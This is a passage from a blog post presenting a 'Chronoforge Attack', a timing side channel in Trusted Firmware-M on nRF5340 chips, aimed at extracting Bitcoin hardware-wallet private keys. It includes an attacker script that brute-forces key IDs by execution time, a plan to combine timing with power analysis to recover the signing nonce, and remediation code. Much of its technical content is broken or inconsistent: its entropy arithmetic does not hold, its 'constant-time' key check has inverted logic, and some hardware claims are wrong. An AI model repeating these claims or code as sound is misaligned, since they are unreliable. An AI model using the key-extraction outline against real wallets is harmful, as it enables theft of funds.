<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Testing the values ​​used before submitting to CC310</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Post-processing in Normal World firmware takes variable time</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.3 Trusted Firmware-M (TF-M) Vulnerabilities</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#43-trusted-firmware-m-tf-m-vulnerabilities"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-1024x568.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-1024x568.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The Nordic nRF5340 uses open-source Trusted Firmware-M (TF-M) to implement the Secure Processing Environment (SPE). TF-M provides:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>PSA Cryptography API</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Secure Storage</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Attestation Services</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Crypto Services interface</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Known timing vulnerabilities in TF-M:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Parameter validation</strong> is performed with variable timing:</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2" class="wp-block-list"><!-- wp:list-item -->
<li><strong>Key material handling</strong> – memory clearing can be variable-time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>MAC verification</strong> — using non-constant-time memcmp()</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Trusted Firmware-M (TF-M): Known Timing Vulnerabilities</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#trusted-firmware-m-tf-m-known-timing-vulnerabilities"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// TF-M Parameter Validation Timing Leak<br><br>psa_status_t tfm_crypto_sign_message(<br>    psa_key_id_t key,<br>    psa_algorithm_t alg,<br>    const uint8_t *input,<br>    size_t input_length,<br>    uint8_t *signature,<br>    size_t signature_size,<br>    size_t *signature_length<br>) {<br>    // VULNERABILITY: Parameter validation has variable timing<br><br>    // Check 1: Invalid key -&gt; ~1-2 µs (fast return)<br>    if (is_key_invalid(key)) {<br>        return PSA_ERROR_INVALID_ARGUMENT;<br>    }<br><br>    // Check 2: Invalid algorithm -&gt; ~10-20 µs (long search)<br>    if (!is_algorithm_compatible(alg)) {<br>        return PSA_ERROR_NOT_SUPPORTED;<br>    }<br><br>    // Total validation time: 5-50 µs depending on which check fails<br>    // This timing leaks information about key and algorithm!<br><br>    // Proceed to constant-time ECDSA signing<br>    return ecdsa_sign_secp256k1_safe(key_data, input, signature);<br>}<br><br>// REMEDIATION: Make all checks constant-time<br>// Execute all validation regardless of results<br>// Branch only after all checks complete</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Подробно:&nbsp;<a href="https://polynonce.ru/tf-m-code-analysis-timing-parameter-validation-vulnerability-exploitation-sequence-using-bitcoin-wallet-as-an-example/">TF-M Code Analysis: Timing Parameter Validation Vulnerability Exploitation Sequence Using Bitcoin Wallet as an Example</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The presented code implements the message signing function in Trusted Firmware-M (TF-M), an open-source implementation of the Secure Processing Environment (SPE) for the Nordic nRF5340:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>psa_status_t tfm_crypto_sign_message(
    psa_key_id_t key,
    psa_algorithm_t alg,
    const uint8_t *input,
    size_t input_length,
    uint8_t *signature,
    size_t signature_size,
    size_t *signature_length
)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>The function is designed to create cryptographic signatures (in this case ECDSA on the secp256k1 curve used in Bitcoin) in a secure environment.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-19.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-19.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Point 1: Identifying the timing vulnerability</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#point-1-identifying-the-timing-vulnerability"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Problem: Variable parameter validation time</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#problem-variable-parameter-validation-time"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The code contains sequential parameter checks with&nbsp;<strong>immediate return</strong>&nbsp;if an error is detected:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Проверка 1: Невалидный ключ -&gt; ~1-2 µs (быстрый возврат)
if (is_key_invalid(key)) {
    return PSA_ERROR_INVALID_ARGUMENT;
}

// Проверка 2: Невалидный алгоритм -&gt; ~10-20 µs (долгий поиск)
if (!is_algorithm_compatible(alg)) {
    return PSA_ERROR_NOT_SUPPORTED;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Critical observation</strong>&nbsp;: The total validation time varies from 5 to 50 microseconds&nbsp;<strong>depending on which check fails</strong>&nbsp;. This creates&nbsp;<strong>a timing oracle</strong>&nbsp;—information leakage due to differences in execution times.&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">^1</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Item 2: Information leakage mechanism</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#item-2-information-leakage-mechanism"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How an attacker extracts information:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-an-attacker-extracts-information"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Step 1: Determining the validity of the key</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The attacker calls the function with various<code>key_id</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Measures execution time with an accuracy of 50-100 ns (Cortex-M33 @ 64 MHz)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Keys that don’t exist</strong> : fast return ~1-2 µs</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Keys that exist</strong> : continue execution >10 µs</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Step 2: Fingerprinting the Algorithm</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The function <code>is_algorithm_compatible()</code>searches through tables of supported algorithms</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Different algorithms have different data structures:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>ECDSA secp256k1</strong> (Bitcoin): ~15 µs (heavy curve parameter validation)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>RSA-2048</strong> : ~8 µs (checking key size)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>AES-GCM</strong> : ~5 µs (mode check)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Result</strong>&nbsp;: The attacker can determine:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Does a specific key exist in the secure storage?</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>What cryptographic algorithm is used (important for Bitcoin – highlight secp256k1)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Point 3: Sequence of operation using a Bitcoin wallet as an example</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#point-3-sequence-of-operation-using-a-bitcoin-wallet-as-an-example"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Hardware wallet attack scenarios:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#hardware-wallet-attack-scenarios"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Phase 1: Brute-force key search with timing analysis</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong># Скрипт атакующего для сбора timing-метрик
valid_candidates = &#91;]

for key_id in range(0, 2**32):
    # Измеряем время выполнения функции
    start = get_precise_timestamp()
    tfm_crypto_sign_message(key_id, PSA_ALG_ECDSA_ANY, test_data, signature)
    duration = get_precise_timestamp() - start

    # Классификация по времени
    if duration &lt; 2:  # микросекунды
        continue  # Несуществующий ключ
    elif duration &lt; 10:
        continue  # Неправильный алгоритм
    else:
        valid_candidates.append(key_id)  # Потенциально валидный ключ</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Efficiency</strong>&nbsp;: 2^32 key space is reduced by about&nbsp;<strong>16 times</strong>&nbsp;to 2^28 candidates.&nbsp;<a href="https://trustedfirmware-m.readthedocs.io/en/latest/security/threat_models/generic_threat_model.html">^1</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Phase 2: Key type definition</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The attacker can distinguish:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Master seed keys</strong> : validation time ~15-20 µs (complex HD wallet structure)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Individual UTXO keys</strong> : ~12-15 µs (simple validation of the derived key)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Change addresses</strong> : similar patterns with individual keys</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Phase 3: Extracting the private key</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>By combining a timing attack with&nbsp;<strong>a power analysis attack</strong>&nbsp;, an attacker can:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Use timing to synchronize energy consumption measurements</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Apply <strong>DPA</strong> (Differential Power Analysis) during ECDSA signing</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Extract the ephemeral nonce <code>k</code>, which results in the full recovery <a href="https://cryptou.ru/vulncipher/privatekey">of the private key</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-21-1024x789.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-21-1024x789.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Point 4: Additional timing vulnerabilities in TF-M</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#point-4-additional-timing-vulnerabilities-in-tf-m"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Vulnerability 2: Key Material Sanitization</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#vulnerability-2-key-material-sanitization"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// УЯЗВИМЫЙ: memset() может быть оптимизирован компилятором
void clear_key_material(uint8_t *key, size_t len) {
    memset(key, 0, len);  // Может быть удален оптимизатором
}

// БЕЗОПАСНЫЙ: Принудительная запись
void clear_key_material_secure(uint8_t *key, size_t len) {
    volatile uint8_t *p = key;
    for (size_t i = 0; i &lt; len; i++) {
        p&#91;i] = 0;  // Принудительная запись, не может быть оптимизирована
    }
    memory_barrier();  // Гарантия завершения перед возвратом
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Problem</strong>&nbsp;: If memory cleaning is optimized, the key remains in RAM and can be extracted via&nbsp;<strong>cold boot attack</strong>&nbsp;or&nbsp;<strong>DMA attack</strong>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Vulnerability 3: MAC Check (memcmp timing attack)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#vulnerability-3-mac-check-memcmp-timing-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// УЯЗВИМЫЙ: Стандартный memcmp выходит при первом несоответствии
int verify_mac(const uint8_t *computed, const uint8_t *expected, size_t len) {
    return memcmp(computed, expected, len) == 0;  // Утечка по времени!
}

// БЕЗОПАСНЫЙ: Постоянное время
int verify_mac_secure(const uint8_t *computed, const uint8_t *expected, size_t len) {
    uint8_t result = 0;
    for (size_t i = 0; i &lt; len; i++) {
        result |= computed&#91;i] ^ expected&#91;i];  // Постоянное время XOR
    }
    return constant_time_eq(result, 0);  // Постоянное время сравнения
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Attack</strong>&nbsp;: An attacker can recover a valid MAC character by character using timing differences.&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">^2</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Item 5: Remediation</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#item-5-remediation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Secure Implementation Pattern</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#secure-implementation-pattern"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>psa_status_t tfm_crypto_sign_message_secure(
    psa_key_id_t key,
    psa_algorithm_t alg,
    const uint8_t *input,
    size_t input_length,
    uint8_t *signature,
    size_t signature_size,
    size_t *signature_length
) {
    // РЕШЕНИЕ: Сделать все проверки постоянными по времени
    // Выполнить все валидации независимо от результатов
    // Ветвление только после завершения всех проверок

    psa_status_t status = PSA_SUCCESS;
    int key_valid = 0;
    int alg_valid = 0;

    // Постоянная по времени валидация ключа (без ранних возвратов)
    key_valid = is_key_invalid_ct(key);  // Версия с постоянным временем

    // Постоянная по времени валидация алгоритма
    alg_valid = is_algorithm_compatible_ct(alg);  // Версия с постоянным временем

    // Ветвление только после завершения всех проверок
    if (!key_valid) {
        status = PSA_ERROR_INVALID_ARGUMENT;
    } else if (!alg_valid) {
        status = PSA_ERROR_NOT_SUPPORTED;
    } else {
        status = ecdsa_sign_secp256k1_safe(key_data, input, signature);
    }

    return status;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Time-constant validation functions</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#time-constant-validation-functions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Постоянная по времени валидация ключа (без утечек)
static inline int is_key_invalid_ct(psa_key_id_t key) {
    // Использование побитовых операций вместо ветвлений
    uint32_t key_max = PSA_KEY_ID_USER_MAX;
    uint32_t key_mask = constant_time_eq(key, key_max);  // Постоянное время сравнение
    return key_mask;  // Возвращает 0 или 1, время не зависит от значения ключа
}

// Постоянная по времени проверка совместимости алгоритма
static inline int is_algorithm_compatible_ct(psa_algorithm_t alg) {
    // Предварительно вычисленная маска валидных алгоритмов
    uint32_t valid_mask = 0;

    // Проверка против всех валидных алгоритмов в постоянном времени
    valid_mask |= constant_time_eq(alg, PSA_ALG_ECDSA_ANY);
    valid_mask |= constant_time_eq(alg, PSA_ALG_RSA_PKCS1V15_SIGN);
    valid_mask |= constant_time_eq(alg, PSA_ALG_RSA_PSS);
    // ... все поддерживаемые алгоритмы

    return valid_mask;  // Возвращает 0 или 1, время не зависит
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Key principles of constant time</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Eliminating early returns ( <code>early returns</code>)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Replacing conditional branches with bitwise operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using hardware constant-time instructions (ARM <code>CMO</code>)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Fault Injection Hardening (FIH) </li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-22-1024x476.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-22-1024x476.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Item 6: Practical Recommendations for Bitcoin Users</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#item-6-practical-recommendations-for-bitcoin-users"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">For owners of hardware wallets on nRF5340</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#for-owners-of-hardware-wallets-on-nrf5340"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Immediate actions:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Check your firmware version</strong> : Make sure you are using TF-M version 1.8.0 or later (if available)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Disable Bluetooth</strong> : On wallets, where possible, disable the BLE stack (some <a href="https://cryptou.ru/vulncipher/attack">attacks</a> are carried out via wireless)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Use multi-signature</strong> : Don’t keep all your funds on one device</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>For new purchases:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Check certification</strong> : Look for PSA Certified Level 2+ or Common Criteria EAL5+</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Research the chipset</strong> : Avoid nRF5340 devices without confirmed patches</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Prefer Secure Elements</strong> : Chips like the Ledger ST33 or Trezor STM32F4 with hardware isolation</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">For wallet developers</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#for-wallet-developers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Mandatory measures:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Static Analysis</strong> : Use Clang Static Analyzer with flags<code>-fsanitize=cfi</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Dynamic testing</strong> :</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong># Тестирование постоянства времени
klee --search=dfs --write-kqueries tfm_crypto.bc</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true,"start":3} -->
<ol start="3" class="wp-block-list"><!-- wp:list-item -->
<li><strong>Formal Verification</strong> : Use Frama-C to Prove Time Constancy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Audit</strong> : Conduct an independent security audit with a focus on side-channel attacks</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">For security researchers</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#for-security-researchers-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeeptech.ru/chronoforge-attack">Research points:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Timing corpus</strong> : Create a dataset of timing measurements for different <code>key_id</code>and<code>alg</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Machine learning</strong> : Apply classifiers (SVM, Random Forest) to automatically identify valid keys</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hybrid Attacks</strong> : Combine Timing with Power Analysis (ChipWhisperer)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Responsible disclosure</strong> : Report discovered vulnerabilities via the Nordic PSIRT and TF-M security mailing list</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Item 7: Technical details for cryptanalysts</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#item-7-technical-details-for-cryptanalysts"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Theoretical basis of the attack</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#theoretical-basis-of-the-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Timing oracle</strong>&nbsp;is an implementation&nbsp;<code>f(x) → (y, t)</code>where:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>x</code>— input parameters (key_id, algorithm)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>y</code>— return status</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>t</code>– lead time</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The vulnerability follows the&nbsp;<strong>decision tree leakage</strong>&nbsp;model :</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Decision Node 1 (key validation)
├─ Branch A: Invalid key (t = 1-2 µs)
└─ Branch B: Valid key → Decision Node 2
   └─ Branch C: Invalid algorithm (t = 10-20 µs)
   └─ Branch D: Valid algorithm (t = 5-50 µs)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Entropy leaked</strong>&nbsp;: log₂(16) = 4 bits per query, which reduces the complexity of a brute force search from 2³² to 2²⁸.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Application to Bitcoin</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#application-to-bitcoin"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>SECP256K1-specific leakage</strong>:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Validation of curve parameters: <code>a = 0</code>, <code>b = 7</code>,<code>p = 2²⁵⁶ - 2³² - 977</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Checking the curve order: <code>n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>These operations take <strong>a predictable time</strong> of ~15-18 µs on the Cortex-M33</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-23.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-23.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">5. Hardware Proof and Results</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#5-hardware-proof-and-results"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5.1 Experimental Setup</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#51-experimental-setup"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s build a POC attack to demonstrate Chronoforge Attack on nRF5340:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Equipment:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>nRF5340 DK (Development Kit)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Oscium iMSO-204X USB oscilloscope (for precise timing measurement)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Laptop с Ubuntu 22.04</li>
